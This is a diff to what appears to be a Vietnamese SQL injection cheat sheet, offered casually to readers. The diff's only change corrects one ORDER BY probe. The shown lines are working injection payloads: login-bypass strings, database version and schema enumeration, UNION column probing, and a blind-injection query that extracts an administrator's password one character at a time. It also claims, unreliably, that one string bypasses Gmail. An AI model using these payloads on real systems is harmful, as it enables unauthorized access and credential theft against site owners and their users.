@@ -5,7 +5,7 @@ SQLi cơ bản:
 'OR1=1--@gmail.com : dùng để bypass gmail, nếu các bác muốn có thể tự tạo nhiều biến thể nữa :v
 admin'or'1'='1 : để bypass login :v
 SELECT * FROM v$version : thu thập thông tin về database
-'UNION SELECT Null,Null-- : để kiểm tra cột bị lỗi. Các bác còn có thể dùng ' UNION ORDER BY 2--
+'UNION SELECT Null,Null-- : để kiểm tra cột bị lỗi. Các bác còn có thể dùng ' ORDER BY 2--
 'UNION SELECT 'heacker',Null-- : để kiểm tra giá trị của databse có cho phép string hay ko.
 SELECT * FROM information_schema.tables : tìm bảng cnf sống thôi
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm : nếu kí tự đầu tiên của passwd lớn hơn m thì OK đây là dạng blind Sqli
